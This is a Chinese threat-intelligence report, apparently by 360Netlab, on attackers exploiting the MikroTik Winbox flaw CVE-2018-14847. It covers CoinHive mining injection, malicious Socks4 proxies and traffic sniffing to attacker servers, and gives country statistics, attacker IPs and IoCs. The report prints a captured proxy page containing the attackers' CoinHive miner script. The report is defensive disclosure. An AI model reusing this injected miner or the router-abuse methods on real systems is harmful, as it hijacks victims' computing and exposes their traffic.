> 原文链接: https://www.anquanke.com//post/id/158864 


# 窃听风云: 你的MikroTik路由器正在被监听


                                阅读量   
                                **359730**
                            
                        |
                        
                                                                                    



[![](https://p4.ssl.qhimg.com/t01fffbc64a1d7ed978.jpg)](https://p4.ssl.qhimg.com/t01fffbc64a1d7ed978.jpg)

## 背景介绍

MikroTik是一家拉脱维亚公司，成立于1996年，致力于开发路由器和无线ISP系统。MikroTik现在为世界上大多数国家/地区的互联网连接提供硬件和软件。在1997年，MikroTik创建了RouterOS软件系统，在2002年，MikroTik决定制造自己的硬件并创建了RouterBOARD品牌，每个RouterBOARD设备都运行RouterOS软件系统。[[1]](https://mikrotik.com/aboutus)

根据维基解密披露的CIA Vault7黑客工具Chimay Red涉及到2个漏洞利用，其中包括Winbox任意目录文件读取（CVE-2018-14847）和Webfig远程代码执行漏洞。[[2]](https://wikileaks.org/ciav7p1/cms/page_16384604.html)

Winbox是一个Windows GUI应用程序，Webfig是一个Web应用程序，两者都是RouterOS一个组件并被设计为路由器管理系统。Winbox和Webfig与RouterOS的网络通信分别在TCP/8291端口上，TCP/80或TCP/8080等端口上。[[3]](https://wiki.mikrotik.com/wiki/Manual:Winbox) [[4]](https://wiki.mikrotik.com/wiki/Manual:Webfig)

通过360Netlab Anglerfish蜜罐系统，我们观察到恶意软件正在利用MikroTik CVE-2018-14847漏洞植入CoinHive挖矿代码，启用Socks4代理，监听路由器网络流量等。同时我们也看到业界已有部分关于CoinHive挖矿和Socks4代理披露，其中包括《BOTNET KAMPANJA NAPADA MIKROTIK USMJERIVAČE》[[5]](https://www.cert.hr/NCBotMikroTik) 和《Mass MikroTik Router Infection – First we cryptojack Brazil, then we take the World?》[[6]](https://www.trustwave.com/Resources/SpiderLabs-Blog/Mass-MikroTik-Router-Infection-%E2%80%93-First-we-cryptojack-Brazil,-then-we-take-the-World-/)

从2018-08-09至今，我们对CVE-2018-14847在全网的分布和利用做了多轮精确度量。每次发起度量时，我们严格遵循Winbox协议发起通信，因此可以精确确认通信对端就是MikroTik 路由器，并且能够准确判定这些路由器是否失陷、以及失陷后被利用做了什么。考虑到MikroTik设备的IP地址会动态更新，本文根据2018-08-23～2018-08-24的扫描数据做分析，并披露一些攻击数据。



## 脆弱性分布

通过对全网TCP/8291端口扫描分析，发现开放该端口的IP数为5,000k，有1,200k确认为Mikrotik设备。其中有 370k(30.83%) 存在CVE-2018-14847漏洞。

[![](https://blog.netlab.360.com/content/images/2018/09/11-2.png)](https://blog.netlab.360.com/content/images/2018/09/11-2.png)

以下是Top 20 国家统计列表（设备数量、国家）。

```
42376 Brazil/BR  
40742 Russia/RU  
22441 Indonesia/ID  
21837 India/IN  
19331 Iran/IR  
16543 Italy/IT  
14357 Poland/PL  
14007 United States/US  
12898 Thailand/TH  
12720 Ukraine/UA  
11124 China/CN  
10842 Spain/ES  
 8758 South Africa/ZA
 8621 Czech/CZ
 6869 Argentina/AR
 6474 Colombia/CO
 6134 Cambodia/KH
 5512 Bangladesh/BD
 4857 Ecuador/EC
 4162 Hungary/HU
```



## 被植入CoinHive挖矿代码

攻击者在启用MikroTik RouterOS http代理功能后，使用了一些技巧，将所有的HTTPProxy请求重定向到一个本地的HTTP 403 error.html 页面。在这个页面中，攻击者嵌入了一个来自 CoinHive.com 的挖矿代码链接。通过这种方式，攻击者希望利用所有经过失陷路由器上HTTP代理的流量来挖矿牟利。

[![](https://blog.netlab.360.com/content/images/2018/09/4-5.png)](https://blog.netlab.360.com/content/images/2018/09/4-5.png)

然而实际上这些挖矿代码不会有效工作。这是因为所有的外部Web资源，包括哪些挖矿所必须的来自CoinHive.com的代码，都会被攻击者自己设定访问控制权限所拦截。下面是一个示例。

```
# curl -i --proxy http://192.168.40.147:8080 http://netlab.360.com
HTTP/1.0 403 Forbidden  
Content-Length: 418  
Content-Type: text/html  
Date: Sat, 26 Aug 2017 03:53:43 GMT  
Expires: Sat, 26 Aug 2017 03:53:43 GMT  
Server: Mikrotik HttpProxy  
Proxy-Connection: close

&lt;html&gt;  
&lt;head&gt;  
   &lt;meta http-equiv="Content-Type" content="text/html; charset=windows-1251"&gt;
   &lt;title&gt;"http://netlab.360.com/"&lt;/title&gt;
&lt;script src="https://coinhive.com/lib/coinhive.min.js"&gt;&lt;/script&gt;  
&lt;script&gt;  
   var miner = new CoinHive.Anonymous('hsFAjjijTyibpVjCmfJzlfWH3hFqWVT3', `{`throttle: 0.2`}`);
   miner.start();
&lt;/script&gt;  
&lt;/head&gt;  
&lt;frameset&gt;  
&lt;frame src="http://netlab.360.com/"&gt;&lt;/frame&gt;  
&lt;/frameset&gt;  
&lt;/html&gt;
```



## 被95.154.216.128/25启用Socks4代理

目前，我们共检测到 239K 个IP被恶意启用Socks4代理，Socks4端口一般为TCP/4153，并设置Socks4代理只允许95.154.216.128/25访问 (这里的权限控制是通过socks代理程序完成，防火墙不会屏蔽任意IP对TCP/4153端口的请求)。

因为MikroTik RouterOS设备会更新IP地址，攻击者设置了定时任务访问攻击者指定的URL以此获取最新的IP地址。此外，攻击者还通过这些失陷的Socks4代理继续扫描更多的MikroTik RouterOS设备。

[![](https://blog.netlab.360.com/content/images/2018/09/5.png)](https://blog.netlab.360.com/content/images/2018/09/5.png)



## 网络流量被监听

MikroTik RouterOS设备允许用户在路由器上抓包，并把捕获的网络流量转发到指定Stream服务器。[[7]](https://wiki.mikrotik.com/wiki/Manual:Tools/Packet_Sniffer)

目前共检测到 7.5k MikroTik RouterOS设备IP已经被攻击者非法监听，并转发TZSP流量到指定的IP地址，通信端口UDP/37008。

37.1.207.114 在控制范围上显著区别于其他所有攻击者。该IP监听了大部分MikroTik RouterOS设备，主要监听TCP协议20，21，25，110，143端口，分别对应FTP-data，FTP，SMTP，POP3，IMAP协议流量。这些应用协议都是通过明文传输数据的，攻击者可以完全掌握连接到该设备下的所有受害者的相关网络流量，包括FTP文件，FTP账号密码，电子邮件内容，电子邮件账号密码等。以下是packet-sniffer页面示例。[![](https://blog.netlab.360.com/content/images/2018/09/6.png)](https://blog.netlab.360.com/content/images/2018/09/6.png)

185.69.155.23 是另外一个有意思的攻击者，他主要监听TCP协议110, 143, 21端口以及UDP协议161，162端口。161/162代表了SNMP（简单网络管理协议，Simple Network Management Protocol），能够支持网络管理系统，用以监测连接到网络上的设备）。[[8]](https://en.wikipedia.org/wiki/Simple_Network_Management_Protocol) 因此，攻击者通过监听SNMP可以得到整个内部网络上的所有连接设备信息。

以下是Top攻击者统计列表（曾经控制设备数量、攻击者IP）。

```
5164 37.1.207.114  
1347 185.69.155.23  
1155 188.127.251.61  
 420 5.9.183.69
 123 77.222.54.45
 123 103.193.137.211
  79 24.255.37.1
  26 45.76.88.43
  16 206.255.37.1
```

以下是所有攻击者Top监听端口统计列表。

```
5837 21  
5832 143  
5784 110  
4165 20  
2850 25  
1328 23  
1118 1500  
1095 8083  
 993 3333
 984 50001
 982 8545
 677 161
 673 162
 355 3306
 282 80
 243 8080
 237 8081
 230 8082
 168 53
 167 2048
```

通过对受害者IP分析，其中俄罗斯受影响最严重。以下是受害者Top分布统计列表。全部的受害者IP地址，不会向公众公布。各受影响国家的相关安全和执法机构，可以向我们联系索取对应的IP地址列表。

```
1628 Russia/RU  
 637 Iran/IR
 615 Brazil/BR
 594 India/IN
 544 Ukraine/UA
 375 Bangladesh/BD
 364 Indonesia/ID
 218 Ecuador/EC
 191 United States/US
 189 Argentina/AR
 122 Colombia/CO
 113 Poland/PL
 106 Kenya/KE
 100 Iraq/IQ
  92 Austria/AT
  92 Asia-Pacific Region/
  85 Bulgaria/BG
  84 Spain/ES
  69 Italy/IT
  63 South Africa/ZA
  62 Czech/CZ
  59 Serbia/RS
  56 Germany/DE
  52 Albania/AL
  50 Nigeria/NG
  47 China/CN
  39 Netherlands/NL
  38 Turkey/TR
  37 Cambodia/KH
  32 Pakistan/PK
  30 United Kingdom/GB
  29 European Union
  26 Latin America
  25 Chile/CL
  24 Mexico/MX
  22 Hungary/HU
  20 Nicaragua/NI
  19 Romania/RO
  18 Thailand/TH
  16 Paraguay/PY
```



## 处置建议

由CVE-2018-14847导致的安全风险远不止于此，我们已经看到MikroTik RouterOS已经被诸多攻击者恶意利用，我们也相信还会有更多的攻击者和攻击手段继续参与进来。

我们建议MikroTik RouterOS用户及时更新软件系统，同时检测http代理，Socks4代理和网络流量抓包功能是否被攻击者恶意利用。

我们建议MikroTik厂商禁止向互联网开放Webfig和Winbox端口，完善软件安全更新机制。

相关安全和执法机构，可以邮件联系netlab[at]360.cn获取被感染的IP地址列表。



## 联系我们

感兴趣的读者，可以在 [twitter](https://twitter.com/360Netlab) 或者在微信公众号 360Netlab 上联系我们。



## IoC

```
37.1.207.114      AS50673 Serverius Holding B.V.  
185.69.155.23     AS200000 Hosting Ukraine LTD  
188.127.251.61    AS56694 Telecommunication Systems, LLC  
5.9.183.69        AS24940 Hetzner Online GmbH  
77.222.54.45      AS44112 SpaceWeb Ltd  
103.193.137.211   AS64073 Vetta Online Ltd  
24.255.37.1       AS22773 Cox Communications Inc.  
45.76.88.43       AS20473 Choopa, LLC  
206.255.37.1      AS53508 Cablelynx  
95.154.216.167    AS20860 iomart Cloud Services Limited.
```
